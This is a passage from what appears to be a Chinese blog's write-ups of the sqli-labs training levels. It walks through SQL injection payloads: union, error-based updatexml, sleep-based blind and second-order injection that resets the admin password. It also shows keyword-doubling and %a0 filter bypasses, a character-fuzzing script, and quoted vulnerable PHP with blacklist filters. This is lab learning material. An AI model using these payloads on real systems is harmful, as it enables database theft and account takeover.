class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里过滤了<code>--</code>和<code>#</code>符号，尝试了双写绕过和url编码绕过，都不行，学习了网上其他师傅的绕过方法，之前都没有用过，下面放payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>最后追加and ‘1’=’1恒等式来闭合最后的引号，这个方法感觉有点巧妙唉，可以看到已经可以控制回显</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926225059015.png" alt="回显页面"></p><p>Less-24: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210927195406710.png"></p><p>第一次学二次注入，说一下二次注入的原理吧，如果存在insert语句，那么就可以吧payload写入数据库，当使用select语句或者其他语句查询到payload时，就会触发payload从而进行利用。下面附带一张讲解图</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210927202326574.png" alt="二次注入原理图"></p><p>这个关卡需要的前提，需要知道一个用户名，需要能够自己注册帐号，且修改密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//造成二次注入的语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>首先注册一个名叫<code>admin&#39; #</code>的用户，假设有一个叫admin的用户我们已经知道，在注册之后选择修改<code>admin&#39; #</code>用户的密码，那么更新语句就会变成下面这样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>相当与我们修改了admin用户的密码而原来的用户密码没有改变。这样在知道很多用户名的情况下就可以随意修改所知道的用户的密码。</p><h1 id="Less-25-25a"><a href="#Less-25-25a" class="headerlink" title="Less-25/25a"></a>Less-25/25a</h1><p>Less-25: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210927204341051.png"></p><p>看名字应该是过滤了and和or关键字，报错注入，之前遇到过，看看可不可以使用双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload测试：</span><br><span class="line">首先测试单引号，发现可以引发报错：id=1&#x27; </span><br><span class="line">在尝试闭合，发现可以截断，存在sql注入：id=1&#x27; --+</span><br><span class="line">在尝试使用and关键字，发现又报错，应该是and被正则匹配过滤：id=1&#x27; and 1=2--+</span><br><span class="line">双写and尝试绕过，成功，猜测正确：id=1&#x27; anandd 1=2--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制回显payload：id=1&#x27; anandd 1=2 union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210927205125760.png" alt="控制回显页面"></p><p>但是作者让我们使用报错注入那就用报错注入搞下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：id=1&#x27; anandd updatexml(1, concat(0x7e, (select version()), 0x7e), 1)--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210927205327175.png" alt="报错注入控制回显"></p><p>其实这关用联合注入就用不到and或者or等关键字，所以作者才提示使用报错注入。</p><p>Less-25a: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210928015104902.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤符号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制回显payload: id=1 anandd 1=2 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210928014911795.png" alt="联合注入控制回显页面"></p><p>但是作者希望我们使用盲注脚本，额，之前的好像也还没有写，下次一定。</p><h1 id="Less-26-26a"><a href="#Less-26-26a" class="headerlink" title="Less-26/26a"></a>Less-26/26a</h1><p>Less-26:<img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210928015336106.png"></p><p>报错注入，过滤了空格和注释。<br>报错注入，且过滤了空格和注释符号，想想要怎么绕过，注入方法前面学了一点后面的关卡应该就是注入加过waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了注释符，那么就使用横等式来绕过：id=1&#x27; and &#x27;1&#x27;=&#x27;1，发现没有报错，不是说过滤了空格吗？。。看源码</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码过滤的符号</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out spaces</span></span><br><span class="line">        <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                <span class="comment">//Strip out slashes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原来过滤了空格。。。还过滤了and，or等常见的关键字都可以用双写绕过，但是空格要怎么绕过呢？</p><p>尝试：url编码（失败），在解析时就已经转换成了ascii码，这个问题还要好好想想，数据传输时编码转换问题。</p><p>​            使用回车url编码，mysql支持回车（失败，暂时不知道为什么）</p><p>​            使用注释绕过，这个关卡不行，应为本身就过滤了注释符号</p><p>网上找的测试能够替代空格键测试的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;0.0.0.0/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br></pre></td></tr></table></figure><p>在经过一番折腾之后确定了可以使用%a0来代替空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: id=1&#x27;%a0aandnd%a0&#x27;1&#x27;=&#x27;2</span><br><span class="line">这个payload可以让后台查找错误没有回显</span><br></pre></td></tr></table></figure><p>由于是基于错误的，现在绕过了waf就很好使用报错注入了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%a0oorr%a0updatexml(1, concat(0x7e, (select%a0version()), 0x7e), 1)%a0oorr%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>Less-26a: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210928015036529.png"></p><p>盲注，且过滤了空格和注释符号，想想要怎么绕过，注入方法前面学了一点后面的关卡应该就是注入加过waf</p><p>试了试和26关差不多，应该是作者想让我们使用盲注的手法来做，要写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试payload: id=1&#x27;)%a0aandnd%a0(&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>再中间添加一条and if语句，就可以实现盲注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">盲注payload: id=1&#x27;)%a0aandnd%a0sleep(5)%a0aandnd%a0(&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>判断注入类型的方法:<br>1和1”正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。</p><p>判断小括号有几种方法：</p><p>2’&amp;&amp;’1’=’1<br>若查询语句为where id=’$id’，查询时是where id=’2’&amp;&amp;’1’=’1’，结果是where id=’2’，回显会是id=2。<br>若查询语句为where id=(‘$id’)，查询时是where id=(‘2’&amp;&amp;’1’=’1’)，MySQL 将’2’作为了 Bool 值，结果是where id=(‘1’)，回显会是id=1。<br>1’)||’1’=(‘1<br>若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</p><h1 id="Less-27-27a"><a href="#Less-27-27a" class="headerlink" title="Less-27/27a"></a>Less-27/27a</h1><p>Less-27: <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210929202525223.png"></p><p>基于错误，过滤了更多的东西，最主要的是union和select关键字，这里涉及到了PHP正则匹配的知识。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">i</span><br><span class="line">如果设定了此修正符，模式中的字符将同时匹配大小写字母。</span><br><span class="line">m</span><br><span class="line">如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</span><br><span class="line">s</span><br><span class="line">如果设定了此修正符，模式中的圆点元字符.匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</span><br><span class="line">x</span><br><span class="line">如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的#以及下一个换行符之间的所有字符，包括两头，也都被忽略。</span><br><span class="line">e</span><br><span class="line">如果设定了此修正符，preg_replace()在替换字符串中对逆向引用作正常的替换。</span><br><span class="line">?</span><br><span class="line">在./+/*之后表示非贪婪匹配，./+/*限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个?就可以实现非贪婪或最小匹配。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);          <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out --.</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);                     <span class="comment">//Strip out #.</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out union</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out UNION</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out SELECT</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);      <span class="comment">//Strip out Union</span></span><br><span class="line">    <span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试id=1和id=1”发现回显正常，单引号报错，存在注入点，但是过滤了很多东西，绕过思路：</p><ul><li>没有过滤and和or关键字，但是我这次想用||和&amp;&amp;两个符号来代替and,or</li><li>select，union可以用大小写混写的方式去绕过，也可以使用双写的方式</li><li>空格，之前提到过，可以用%a0等url编码的方式绕过</li><li>注释符号过滤，后面的单引号无法注释就使用横等式来闭合后面的单引号</li></ul><p>开始测试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先使用联合注入控制回显：id=1&#x27;%a0and%a0&#x27;1&#x27;=&#x27;2&#x27;%a0UnIon%a0SeLeCT%a01,2,3%a0and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210929231920414.png" alt="回显页面"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试使用报错注入：</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-21-22&quot;&gt;&lt;a href=&quot;#Less-21-22&quot; class=&quot;headerlink&quot; title=&quot;Less-21/22&quot;&gt;&lt;/a&gt;Less-21/22&lt;/h1&gt;&lt;p&gt;Less-21: &lt;img src=&quot;https://raw.githubu</summary>
      
    
    
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql-lab-base</title>
    <link href="http://example.com/2/"/>
    <id>http://example.com/2/</id>
    <published>2021-09-27T10:45:09.365Z</published>
    <updated>2022-01-01T09:52:11.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="需要掌握的MySQL基本知识"><a href="#需要掌握的MySQL基本知识" class="headerlink" title="需要掌握的MySQL基本知识"></a>需要掌握的MySQL基本知识</h1><p>imformation_schema数据库中有很多张表，其中有用的信息如下：</p><p>tables_schema：存放每个数据库中的所有表名，常用查询语句 <code>select table_name from imformation_schema.tables where table_schema = &#39;xxxx&#39;</code></p><p>columns：存放表名，以及每张表的列名，常用查询语句<code>select column_name from imformation_schema.columns where table_name = &#39;xxxx&#39;</code></p><p>常用函数：</p><ul><li>version()，查询系统版本</li><li>database()，查询当前数据库名</li><li>concat()，使用符号连接字符串</li><li>group_concat()，将多个返回信息变成一列</li></ul><h1 id="Less-1-2"><a href="#Less-1-2" class="headerlink" title="Less-1/2"></a>Less-1/2</h1><p>Less-1: 字符形注入，需要加单引号。</p><p>Less-2: 数字型注入，不需要加单引号就可以注入。</p><h1 id="Less-3-4"><a href="#Less-3-4" class="headerlink" title="Less-3/4"></a>Less-3/4</h1><p>Less-3: 从源代码看出查询语句加入了括号，目标就是绕过括号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>原理和单引号差不多，但是多了括号就需要有括号的闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-3/?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>Less-4: 和第三关一样，区别就是从单引号变成了双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-4/?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h1 id="Less-5-6"><a href="#Less-5-6" class="headerlink" title="Less-5/6"></a>Less-5/6</h1><p>Less-5: 报错注入，这里使用updatexml函数，常用的两个函数如下</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210914110623524.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-5/?id=-1&#x27; and updatexml(1, concat(0x7e, (select database())), 1)--+</span><br></pre></td></tr></table></figure><p>Less-6: 单引号变双引号，那就闭合双引号，作者源代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-6/?id=1&quot; and updatexml(1, concat(0x7e, (select database())), 1)--+</span><br></pre></td></tr></table></figure><h1 id="Less-7-8"><a href="#Less-7-8" class="headerlink" title="Less-7/8"></a>Less-7/8</h1><p>使用into_outfile函数写一句话木马，拿到网站webshell，buu上目前无法获取网站路径，先跳过，后面搭建本地环境搞。</p><h1 id="Less-9-10"><a href="#Less-9-10" class="headerlink" title="Less-9/10"></a>Less-9/10</h1><p>sql盲注，没有了所有报错回显，脚本在写了在写了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">        if($row)</span><br><span class="line">        &#123;</span><br><span class="line">        echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">        echo &#x27;You are in...........&#x27;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">        echo &#x27;You are in...........&#x27;;</span><br><span class="line">        //print_r(mysql_error());</span><br><span class="line">        //echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">        echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">        echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Less-11-12"><a href="#Less-11-12" class="headerlink" title="Less-11/12"></a>Less-11/12</h1><p>Less-11：使用登录框登录，不同与之前，这次的提交方式是Post，但是注入方式和之前一样</p><p>源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">        $uname=$_POST[&#x27;uname&#x27;];</span><br><span class="line">        $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">        //logging the connection parameters to a file for analysis.</span><br><span class="line">        $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">        fwrite($fp,&#x27;User Name:&#x27;.$uname);</span><br><span class="line">        fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\n&quot;);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // connectivity </span><br><span class="line">        @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">        echo $sql.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        $result=mysql_query($sql);</span><br><span class="line">        $row = mysql_fetch_array($result);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=admin&amp;passwd=admin&#x27; and 1=2 union select database(),version()#</span><br></pre></td></tr></table></figure><p>Less-12：同样是使用post提交方式，但是在提交之前对两个变量添加了双引号，并且在查询的时候使用的括号，源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所以在注入的时候需要添加双引号和括号进行闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=admin&amp;passwd=admin&quot;) and 1=2 union select 1,2#</span><br></pre></td></tr></table></figure><h1 id="Less-13-14"><a href="#Less-13-14" class="headerlink" title="Less-13/14"></a>Less-13/14</h1><p>Less-13：双注入，没有任何回显，使用报错注入，源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">   @$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">   $result=mysql_query($sql);</span><br><span class="line">   $row = mysql_fetch_array($result);</span><br><span 